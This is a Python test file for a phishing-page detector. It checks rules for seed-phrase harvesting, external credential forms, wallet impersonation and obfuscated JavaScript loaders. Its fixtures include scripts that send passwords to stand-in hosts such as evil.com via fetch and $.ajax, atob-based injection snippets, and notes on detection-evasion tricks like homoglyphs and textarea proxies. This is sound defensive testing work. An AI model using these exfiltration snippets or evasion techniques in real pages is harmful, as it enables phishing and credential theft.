"""Tests for individual rule modules."""

from src.ml.features import parse_html
from src.rules.external_form import ExternalFormRule
from src.rules.obfuscated_loader import ObfuscatedLoaderRule
from src.rules.seed_phrase import SeedPhraseRule
from src.rules.wallet_impersonation import WalletImpersonationRule

from tests.fixtures import (
    BRACKET_NOTATION_EXFIL,
    CLEAN_HTML,
    EXTERNAL_FORM_PHISHING,
    IMAGE_PIXEL_EXFIL,
    MINIMAL_HTML,
    OBFUSCATED_BRACKET_NOTATION,
    OBFUSCATED_FUNCTION_CONSTRUCTOR,
    OBFUSCATED_LOADER_PHISHING,
    OBFUSCATED_UNICODE_ESCAPES,
    PASSWORD_CONTENTEDITABLE_EXFIL,
    PASSWORD_TEXTAREA_EXFIL,
    PROTOCOL_RELATIVE_EXFIL,
    SEED_PHRASE_CONTENTEDITABLE_EVASION,
    SEED_PHRASE_PHISHING,
    SEED_PHRASE_TEXTAREA_EVASION,
    SENDBEACON_EXFIL,
    WALLET_HOMOGLYPH_PHISHING,
    WALLET_IMPERSONATION_PHISHING,
    WALLET_SOFT_HYPHEN_PHISHING,
    WALLET_SPLIT_BRAND_PHISHING,
    WEBSOCKET_EXFIL,
)


class TestSeedPhraseRule:
    def setup_method(self):
        self.rule = SeedPhraseRule()

    def test_triggers_on_seed_phrase_page(self):
        soup = parse_html(SEED_PHRASE_PHISHING)
        result = self.rule.evaluate(SEED_PHRASE_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "seed-phrase-harvesting"
        assert result.signals["input_count"] >= 8

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_few_inputs_does_not_trigger(self):
        html = """<html><body>
        <p>Enter your recovery phrase</p>
        <input type="text"><input type="text"><input type="text">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # only 3 inputs, need 6

    def test_textarea_evasion_triggers(self):
        """Phishing kits using <textarea> instead of <input> to evade detection."""
        soup = parse_html(SEED_PHRASE_TEXTAREA_EVASION)
        result = self.rule.evaluate(SEED_PHRASE_TEXTAREA_EVASION, soup)
        assert result.triggered is True
        assert result.signals["textarea_count"] == 7
        assert result.signals["total_inputs"] >= 6

    def test_contenteditable_evasion_triggers(self):
        """Phishing kits using contenteditable divs as input proxies."""
        soup = parse_html(SEED_PHRASE_CONTENTEDITABLE_EVASION)
        result = self.rule.evaluate(SEED_PHRASE_CONTENTEDITABLE_EVASION, soup)
        assert result.triggered is True
        assert result.signals["editable_count"] == 8
        assert result.signals["total_inputs"] >= 6

    def test_six_inputs_with_seed_terms_triggers(self):
        """Threshold lowered from 8 to 6 catches split-mnemonic phishing."""
        html = """<html><body>
        <p>Enter your recovery phrase</p>
        <input type="text"><input type="text"><input type="text">
        <input type="text"><input type="text"><input type="text">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True

    def test_five_inputs_does_not_trigger(self):
        """Five inputs is still below threshold even with seed terms."""
        html = """<html><body>
        <p>Enter your recovery phrase</p>
        <input type="text"><input type="text"><input type="text">
        <input type="text"><input type="text">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False

    def test_recovery_key_term_triggers(self):
        """New term 'recovery key' is detected."""
        html = """<html><body>
        <p>Enter your recovery key</p>
        <input type="text"><input type="text"><input type="text">
        <input type="text"><input type="text"><input type="text">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True


class TestExternalFormRule:
    def setup_method(self):
        self.rule = ExternalFormRule()

    def test_triggers_on_external_form(self):
        soup = parse_html(EXTERNAL_FORM_PHISHING)
        result = self.rule.evaluate(EXTERNAL_FORM_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "external-credential-form"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_internal_action_does_not_trigger(self):
        html = """<html><body>
        <form action="/login" method="POST">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # relative URL, not external

    def test_js_ajax_exfil_triggers(self):
        """Password + $.ajax to external URL = credential exfiltration."""
        html = """<html><body>
        <form action="#">
            <input type="text" name="email">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        <script>
        $.ajax({
            url: "https://evil-collector.com/steal",
            method: "POST",
            data: {email: $("#email").val(), pw: $("#pw").val()}
        });
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
        assert len(result.signals["strong_exfil_patterns"]) > 0

    def test_js_fetch_with_cred_access_triggers(self):
        """Password + fetch() reading .value to external URL = exfiltration."""
        html = """<html><body>
        <input type="password" id="pw">
        <script>
        var pw = document.getElementById("pw").value;
        fetch("https://evil.com/collect", {method: "POST", body: pw});
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
        assert result.signals["fetch_with_creds"] is True

    def test_js_fetch_without_cred_access_does_not_trigger(self):
        """Password + fetch() without .value/FormData = NOT exfiltration.
        This is the key false-positive fix: modern apps use fetch() for
        routine API calls alongside login forms."""
        html = """<html><body>
        <input type="password" name="pw">
        <script>
        fetch("https://api.example.com/config").then(r => r.json());
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False

    def test_password_with_no_exfil_does_not_trigger(self):
        """Password field alone without external communication is not enough."""
        html = """<html><body>
        <form action="#">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        <script>console.log("hello");</script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False

    def test_sendbeacon_exfil_triggers(self):
        """navigator.sendBeacon() is a fire-and-forget exfil method."""
        soup = parse_html(SENDBEACON_EXFIL)
        result = self.rule.evaluate(SENDBEACON_EXFIL, soup)
        assert result.triggered is True

    def test_websocket_exfil_triggers(self):
        """WebSocket to external URL = credential exfiltration."""
        soup = parse_html(WEBSOCKET_EXFIL)
        result = self.rule.evaluate(WEBSOCKET_EXFIL, soup)
        assert result.triggered is True

    def test_image_pixel_exfil_triggers(self):
        """new Image().src = external URL = pixel exfiltration."""
        soup = parse_html(IMAGE_PIXEL_EXFIL)
        result = self.rule.evaluate(IMAGE_PIXEL_EXFIL, soup)
        assert result.triggered is True

    def test_bracket_notation_ajax_triggers(self):
        """$["ajax"] bracket notation evades dot-notation-only matching."""
        soup = parse_html(BRACKET_NOTATION_EXFIL)
        result = self.rule.evaluate(BRACKET_NOTATION_EXFIL, soup)
        assert result.triggered is True

    def test_password_textarea_triggers(self):
        """Password entered via <textarea> with external form action."""
        soup = parse_html(PASSWORD_TEXTAREA_EXFIL)
        result = self.rule.evaluate(PASSWORD_TEXTAREA_EXFIL, soup)
        assert result.triggered is True
        assert result.signals["password_input_kind"] == "textarea[password-named]"

    def test_password_contenteditable_triggers(self):
        """Password entered via contenteditable div with JS exfil."""
        soup = parse_html(PASSWORD_CONTENTEDITABLE_EXFIL)
        result = self.rule.evaluate(PASSWORD_CONTENTEDITABLE_EXFIL, soup)
        assert result.triggered is True
        assert result.signals["password_input_kind"] == "contenteditable[password-named]"

    def test_protocol_relative_form_action_triggers(self):
        """Protocol-relative URL (//evil.com) in form action."""
        soup = parse_html(PROTOCOL_RELATIVE_EXFIL)
        result = self.rule.evaluate(PROTOCOL_RELATIVE_EXFIL, soup)
        assert result.triggered is True

    def test_bracket_value_access_triggers(self):
        """input["value"] bracket notation for credential access with fetch."""
        html = """<html><body>
        <input type="password" id="pw">
        <script>
        var pw = document.getElementById("pw")["value"];
        fetch("https://evil.com/steal", {method: "POST", body: pw});
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
        assert result.signals["fetch_with_creds"] is True


class TestWalletImpersonationRule:
    def setup_method(self):
        self.rule = WalletImpersonationRule()

    def test_triggers_on_wallet_impersonation(self):
        soup = parse_html(WALLET_IMPERSONATION_PHISHING)
        result = self.rule.evaluate(WALLET_IMPERSONATION_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "wallet-impersonation"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_brand_without_credential_capture_does_not_trigger(self):
        html = """<html><head><title>MetaMask News</title></head>
        <body><h1>MetaMask updates</h1><p>New features released.</p></body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # no password/key phrases

    def test_brand_with_key_phrases_but_no_password_does_not_trigger(self):
        """Editorial content discussing wallets should not trigger.
        Regression test for false positives on blogs/dApps."""
        html = """<html><head><title>Crypto Guide</title></head>
        <body><h1>Binance Tutorial</h1>
        <p>Store your seed phrase in a safe place.</p>
        <p>Never share your private key with anyone.</p>
        <input type="text" placeholder="Search articles...">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # key phrases without password input

    def test_cyrillic_homoglyph_brand_triggers(self):
        """Cyrillic а (U+0430) replacing Latin a should still match."""
        soup = parse_html(WALLET_HOMOGLYPH_PHISHING)
        result = self.rule.evaluate(WALLET_HOMOGLYPH_PHISHING, soup)
        assert result.triggered is True
        assert "metamask" in result.signals["matched_brands"]

    def test_soft_hyphen_brand_triggers(self):
        """Soft hyphen (U+00AD) inserted in brand name should still match."""
        soup = parse_html(WALLET_SOFT_HYPHEN_PHISHING)
        result = self.rule.evaluate(WALLET_SOFT_HYPHEN_PHISHING, soup)
        assert result.triggered is True
        assert "metamask" in result.signals["matched_brands"]

    def test_split_brand_name_triggers(self):
        """Brand name split with spaces ('Meta Mask') should still match."""
        soup = parse_html(WALLET_SPLIT_BRAND_PHISHING)
        result = self.rule.evaluate(WALLET_SPLIT_BRAND_PHISHING, soup)
        assert result.triggered is True
        assert "metamask" in result.signals["matched_brands"]

    def test_password_textarea_proxy_triggers(self):
        """Wallet brand + password via <textarea> should trigger."""
        html = """<html><head><title>Phantom Wallet</title></head>
        <body><h1>Phantom</h1>
        <textarea id="password" placeholder="Enter password"></textarea>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True

    def test_password_contenteditable_proxy_triggers(self):
        """Wallet brand + password via contenteditable should trigger."""
        html = """<html><head><title>Phantom Wallet</title></head>
        <body><h1>Phantom</h1>
        <div contenteditable="true" id="passwd" aria-label="Password"></div>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True


class TestObfuscatedLoaderRule:
    def setup_method(self):
        self.rule = ObfuscatedLoaderRule()

    def test_triggers_on_obfuscated_loader(self):
        soup = parse_html(OBFUSCATED_LOADER_PHISHING)
        result = self.rule.evaluate(OBFUSCATED_LOADER_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "obfuscated-loader"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_normal_script_does_not_trigger(self):
        html = """<html><body>
        <script>console.log("hello world");</script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False

    def test_minified_jquery_does_not_trigger(self):
        """Minified jQuery uses innerHTML and String.fromCharCode internally
        for DOM manipulation and Unicode handling. This must not trigger.
        Regression test for AOX app false positive."""
        html = """<html><body>
        <script>
        !function(e,t){"use strict";function m(e,t,n){
        var r,i,o=(n=n||C).createElement("script");
        o.text=e;n.head.appendChild(o).parentNode.removeChild(o)}
        r.appendChild(e).innerHTML="<a id='test'>";
        return t||(n<0?String.fromCharCode(n+65536):
        String.fromCharCode(n>>10|55296,1023&n|56320));
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False

    def test_bracket_notation_injection_triggers(self):
        """document["write"] + window["atob"] bracket notation evasion."""
        soup = parse_html(OBFUSCATED_BRACKET_NOTATION)
        result = self.rule.evaluate(OBFUSCATED_BRACKET_NOTATION, soup)
        assert result.triggered is True

    def test_unicode_escape_payload_triggers(self):
        """Long unicode escape sequences (\\uXXXX) with eval."""
        soup = parse_html(OBFUSCATED_UNICODE_ESCAPES)
        result = self.rule.evaluate(OBFUSCATED_UNICODE_ESCAPES, soup)
        assert result.triggered is True
        assert result.signals["has_unicode_escapes"] is True

    def test_function_constructor_triggers(self):
        """Function(atob(encoded))() is an eval equivalent."""
        soup = parse_html(OBFUSCATED_FUNCTION_CONSTRUCTOR)
        result = self.rule.evaluate(OBFUSCATED_FUNCTION_CONSTRUCTOR, soup)
        assert result.triggered is True

    def test_innerhtml_plus_equals_triggers(self):
        """innerHTML += is a DOM injection variant."""
        html = """<html><body>
        <script>
        var payload = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
        document.body.innerHTML += atob(payload);
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True

    def test_bracket_innerHTML_triggers(self):
        """element["innerHTML"] bracket notation evasion."""
        html = """<html><body>
        <script>
        var payload = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB";
        document.body["innerHTML"] = atob(payload);
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
